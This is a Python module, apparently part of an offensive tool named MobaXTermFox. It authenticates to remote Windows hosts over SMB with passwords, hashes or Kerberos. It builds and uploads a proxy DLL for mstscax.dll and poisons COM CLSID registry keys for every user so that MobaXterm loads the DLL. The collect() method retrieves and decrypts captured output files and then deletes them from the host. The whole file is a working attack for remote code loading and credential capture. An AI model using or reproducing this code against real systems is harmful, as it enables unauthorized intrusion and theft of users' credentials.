import time
from impacket.smbconnection import SMBConnection, SessionError
from impacket import smb
from impacket.dcerpc.v5 import rrp
from shutil import copy
from os import path, environ

import platform
import logging
import pefile
import subprocess
import tempfile
import hashlib
from io import BytesIO

from remoteRegistry import RemoteRegistry


class MobaXTermFox:
    def __init__(
        self,
        domain: str,
        username: str,
        password: str,
        lmhash: str,
        nthash: str,
        aesKey: str,
        useKerberos: bool,
        dc_ip: str | None,
        tempDir: str,
        poisonHkcrInstead: bool = False,
        clsid="8B918B82-7985-4C24-89DF-C33AD2BBFBCD",
    ) -> None:
        self.domain = domain
        self.username = username
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.aesKey = aesKey
        self.useKerberos = useKerberos
        self.dc_ip = dc_ip
        self.tempDir = tempDir
        self.poisonHkcrInstead = poisonHkcrInstead
        self.clsid = clsid

    def doCLSIDPoisonning(self, host: str) -> bool:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's check if the temporary directory has already been created

        tempPath = f"Windows\\Temp\\{self.tempDir}"

        try:
            smbClient.createDirectory("C$", f"{tempPath}")
        except SessionError as e:
            if e.getErrorCode() == 0xC0000035:
                # STATUS_OBJECT_NAME_COLLISION, occurs if the directory already exists
                logging.warning(
                    f"Temporary directory already exists, assuming it is ok."
                )
            else:
                logging.error(f"Error while creating C:\\{tempPath} ")
                return

        # Now access the remote registry, to poison the HKCU hive
        # We want to define a CLSID redirection so that our DLL gets loaded whenever our target CLSID is CoCreateInstance'd

        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        # Sanity check : let's ensure that the original CLSID is implemented in mstscax.dll

        try:
            machineInprocServer = remoteRegistry.getKeyValues(
                f"HKCR\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32"
            )
        except rrp.DCERPCException as e:
            logging.error(f"Failed reading machine InprocServer32")
            return

        clsidDllPath = machineInprocServer.get("(Default)")

        # getKeyValues return a list of tuples, the first value being the type
        # Ensure that the default value exists and is of type REG_EXPAND_SZ (2)

        if clsidDllPath == None or clsidDllPath[0] not in [
            rrp.REG_EXPAND_SZ,
            rrp.REG_SZ,
        ]:
            logging.error(
                f"[{host}] Original HKCR\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32 does not have a default value, or unexpected type. Abort"
            )
            return

        # The path is usually %systemroot%\system32\mstscax.dll

        originalDllPath = clsidDllPath[1].lower().split("\\")

        if originalDllPath[-2] != "system32" or originalDllPath[-1] != "mstscax.dll":
            logging.error(
                f"[{host}] The origin CLSID is registered to an unexpected DLL : {clsidDllPath}"
            )
            return

        # Everything seems OK, let's compile our DLL
        # Just to be sure that we do not break anything, let's retreive the original mstscax.dll to get the exports

        try:
            dllData = BytesIO()
            smbClient.getFile("C$", "Windows\\System32\\mstscax.dll", dllData.write)
        except SessionError:
            logging.error(
                f"[{host}] Failed opening/reading C:\\windows\\system32\\mstscax.dll"
            )
            return

        # Now list exported functions to see if they contain mangled names.

        dll = pefile.PE(data=dllData.getvalue(), fast_load=False)
        dll.parse_data_directories()

        # Sanity check : ensure that it is the correct architecure
        if dll.FILE_HEADER.Machine != pefile.MACHINE_TYPE["IMAGE_FILE_MACHINE_AMD64"]:
            logging.error(
                f"[{host}] C:\\windows\\system32\\mstscax.dll has unexpected architecture"
            )
            return

        try:
            exports = [e for e in dll.DIRECTORY_ENTRY_EXPORT.symbols]
        except AttributeError:
            logging.error(f"[{host}] Could not parse exports of mstscax.dll. Aborting")
            for exp in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                print(
                    hex(dll.OPTIONAL_HEADER.ImageBase + exp.address),
                    exp.name,
                    exp.ordinal,
                )

            return

        # Ensure that no symbol are only exported by ordinal

        if any([b"" == export.name for export in exports]):
            logging.debug(
                f"[{host}] mstscax.dll exports a symbol by ordinal only. Aborting"
            )
            return

        # We have the exported symbols.
        # Let's compute the MD5 of the data

        dllMd5 = hashlib.md5(dllData.getvalue()).hexdigest()

        # Check if we have already created the proxy dll
        if not path.exists(
            path.join(
                path.dirname(__file__),
                "cache",
                f'{"mstscax_32." + dllMd5 + ".dll"}',
            )
        ):
            # It doesn't exist yet, let's create the exported function list for our DLL
            # The .def file is not recognized if the extension is not .def

            tempFileHandle = tempfile.NamedTemporaryFile(
                mode="w", suffix=".data", delete=False
            )

            for export in exports:
                tempFileHandle.write(
                    f"{export.name.decode()}=mstscax.{export.name.decode()} @{export.ordinal}\n"
                )

            tempFileHandle.flush()

            cargo_path = path.abspath(
                path.join(path.dirname(__file__), "..", "mobaxtermfox")
            )

            cmd = ["cargo", "clean"]

            subprocess.run(cmd, cwd=cargo_path)

            # Now let's compile our sideloaded DLL with the matching exports
            # MobaRTE is a 32 bits process, so our DLL must be too !

            # Define the target rust compiler
            # For windows, use msvc, for Linux, use mingw
            if platform.system() == "Windows":
                targetName = "i686-pc-windows-msvc"
            else:
                targetName = "i686-pc-windows-gnu"

            # Now let's compile our sideloaded DLL with the matching exports
            cmd = ["cargo", "build", "--target", targetName, "--release"]

            logging.info(f"[{host}] Compiling mstscax dll proxy ...")

            new_env = environ
            new_env["OUTPUT_PATH"] = f"C:\\{tempPath}\\mobaxterm."
            if platform.system() == "Windows":
                from win32 import win32file

                new_env["EXPORTS_FILE"] = win32file.GetLongPathName(tempFileHandle.name)
            else:
                new_env["EXPORTS_FILE"] = tempFileHandle.name

            subprocess.run(cmd, cwd=cargo_path, env=new_env)

            # We don't need the temporary file anymore
            tempFileHandle.close()

            copy(
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "..",
                        "mobaxtermfox",
                        "target",
                        targetName,
                        # "debug",
                        "release",
                        "mobaxtermfox.dll",
                    )
                ),
                path.abspath(
                    path.join(
                        path.dirname(__file__),
                        "cache",
                        f'{"mstscax_32." + dllMd5 + ".dll"}',
                    )
                ),
            )

        # Get our DLL data
        with open(
            path.abspath(
                path.join(
                    path.dirname(__file__),
                    "cache",
                    f'{"mstscax_32." + dllMd5 + ".dll"}',
                )
            ),
            "rb",
        ) as f:
            dllDataToUpload = f.read()

        uploadData = BytesIO(dllDataToUpload)

        try:
            smbClient.putFile(
                "c$", f"{tempPath}\\mstscax_32_{dllMd5}.dll", uploadData.read
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed uploading proxy dll mstscax to C:\\{tempPath}"
            )
            logging.error(e)
            return

        if self.poisonHkcrInstead:
            # Set the default value to point to our DLL
            try:
                remoteRegistry.setKeyValueSZData(
                    f"HKCR\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32",
                    "(Default)",
                    rrp.REG_SZ,
                    f"C:\\{tempPath}\\mstscax_32_{dllMd5}.dll",
                )
            except Exception as e:
                logging.error(
                    f"[{host}] Error setting HKCR\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32"
                )
                logging.error(e)
        else:
            # Now let's poison all users' HKCU hives
            usersHives = remoteRegistry.listSubKeys("HKU\\")
            usersHives = [
                hive for hive in usersHives if hive + "_Classes" in usersHives
            ]

            for hive in usersHives:
                # First let's check if the key exists:
                try:
                    remoteRegistry.getKeyValues(
                        f"HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32"
                    )
                except rrp.DCERPCSessionError as e:
                    # Error code 0x2 is ERROR_FILE_NOT_FOUND
                    if e.get_error_code() != 2:
                        logging.error(
                            f"Got unexpected error why checking if key already exists : {e.get_error_code}"
                        )
                        continue

                else:
                    logging.warning(
                        f"Key already exists ! Assuming the InprocServer32 has already be set to a value we control for user with SID {hive}"
                    )
                    continue

                # The key does not exist yet, let's continue
                # Now we create the InprocServer32 key. This creates missing subkeys as well.

                try:
                    remoteRegistry.createKey(
                        f"HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InProcServer32"
                    )
                except Exception as e:
                    logging.error(
                        f"[{host}] Error creating HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InProcServer32"
                    )
                    logging.error(e)
                    continue

                # Set the default value to point to our DLL

                try:
                    remoteRegistry.setKeyValueSZData(
                        f"HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32",
                        "(Default)",
                        rrp.REG_SZ,
                        f"C:\\{tempPath}\\mstscax_32_{dllMd5}.dll",
                    )
                except Exception as e:
                    logging.error(
                        f"[{host}] Error setting HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32"
                    )
                    logging.error(e)
                    continue

        print(f"[{host}] Successfully poisonned MobaXTerm")

    def cleanup(self, host: str) -> None:
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        # Let's check if the temporary directory has already been created
        # Now access the remote registry, to cleanup all hives in HKCU

        remoteRegistry = RemoteRegistry(smbClient)
        remoteRegistry.startRemoteRegistryService()
        remoteRegistry.connectToRemoteRegistry()

        usersHives = remoteRegistry.listSubKeys("HKU\\")
        usersHives = [hive for hive in usersHives if hive + "_Classes" in usersHives]

        for hive in usersHives:
            # First let's check if the key exists:
            try:
                remoteRegistry.getKeyValues(
                    f"HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}"
                )
            except rrp.DCERPCSessionError as e:
                # Error code 0x2 is ERROR_FILE_NOT_FOUND
                if e.get_error_code() != 2:
                    logging.info(
                        f"[{host}] Error checking if HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}} exists"
                    )
                    logging.error(e)
                continue

            #  Key already exists ! Delete it, starting with subkey
            try:
                remoteRegistry.deleteKey(
                    f"HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InProcServer32"
                )
            except Exception as e:
                logging.error(
                    f"[{host}] Failed deleting HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}"
                )
                logging.error(e)

            try:
                remoteRegistry.deleteKey(
                    f"HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}"
                )
            except Exception as e:
                logging.error(
                    f"[{host}] Failed deleting HKU\\{hive}_Classes\\WOW6432Node\\CLSID\\{{{self.clsid}}}"
                )
                logging.error(e)
                continue

        # Cleanup HKCR too
        try:
            remoteRegistry.setKeyValueSZData(
                f"HKCR\\WOW6432Node\\CLSID\\{{{self.clsid}}}\\InprocServer32",
                "(Default)",
                rrp.REG_SZ,
                f"C:\\Windows\\System32\\mstscax.dll",
            )
        except Exception as e:
            logging.error(
                f"[{host}] Error setting HKLM\\SOFTWARE\\Classes\\CLSID\\{{{self.clsid}}}\\InprocServer32"
            )
            logging.error(e)

        # Now cleanup the proxy DLL in the temp dir
        # This may file, notably if MobaRTE.exe is running.
        # This is OK, the DLL won't be loaded on subsequent MobaRTE.exe runs, it just needs later cleanup

        try:
            filesInTempDir: list[smb.SharedFile] = smbClient.listPath(
                "c$", f"Windows\\Temp\\{self.tempDir}\\*"
            )
        except SessionError as e:
            logging.error(
                f"[{host}] Failed listing files in C:\\Windows\\Temp\\{self.tempDir} for cleanup."
            )
            logging.error(e)
            return

        dllsInDirectory = [
            f.get_longname()
            for f in filesInTempDir
            if f.get_longname().endswith(".dll")
        ]

        targetFiles = [i for i in dllsInDirectory if i.startswith("mstscax_32")]
        for file in targetFiles:
            try:
                smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                logging.debug(
                    f"[{host}] Deleted C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                )

            except SessionError:
                logging.warning(
                    f"[{host}] Could not delete C:\\Windows\\Temp\\{self.tempDir}\\{file}, it is probably in use."
                )
                continue
        print(f"[{host}] MobaXTerm.exe cleanup complete !")

    def collect(self, host, box):
        smbClient = SMBConnection(host, host, timeout=2)

        if self.useKerberos:
            smbClient.kerberosLogin(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
                self.dc_ip,
            )
        else:
            smbClient.login(
                self.username, self.password, self.domain, self.lmhash, self.nthash
            )

        try:
            filesInConfigDirectory: list[smb.SharedFile] = smbClient.listPath(
                "C$", f"Windows/Temp/{self.tempDir}/*"
            )

            outputFiles = [
                f.get_longname()
                for f in filesInConfigDirectory
                if f.get_longname().startswith("mobaxterm.")
            ]

            for file in outputFiles:
                try:
                    outputData = BytesIO()
                    smbClient.getFile(
                        "C$", f"Windows\\Temp\\{self.tempDir}\\{file}", outputData.write
                    )
                except SessionError:
                    logging.error(
                        f"[{host}] Failed opening/reading C:\\Windows\\Temp\\{file}"
                    )

                plaintexts = box.decryptFile(outputData.getvalue())
                with open(
                    path.join(
                        path.dirname(__file__),
                        "output",
                        f"mobaxterm-{int(time.time())}.txt",
                    ),
                    "a",
                ) as f:
                    for plaintext in plaintexts:
                        f.write(plaintext + "\n")

                # Now, let's delete the file one the remote host
                try:
                    smbClient.deleteFile("C$", f"Windows\\Temp\\{self.tempDir}\\{file}")
                except SessionError:
                    logging.error(
                        f"[{host}] Failed deleting C:\\Windows\\Temp\\{self.tempDir}\\{file}"
                    )
                    logging.error(e)
                    continue

        except SessionError as e:
            logging.info(f"[{host}] Failed opening directory C:\\Windows\\Temp")
